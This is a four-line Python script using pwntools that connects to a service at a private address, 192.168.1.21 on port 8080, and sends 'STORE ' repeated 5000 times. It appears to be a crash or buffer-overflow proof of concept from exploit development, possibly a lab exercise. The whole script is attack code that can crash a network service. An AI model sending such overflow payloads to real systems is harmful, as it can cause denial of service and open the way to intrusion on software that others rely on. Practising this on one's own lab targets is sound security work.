from pwn import *

io = remote('192.168.1.21', 8080)
io.send("STORE " * 5000 + '\r\n')
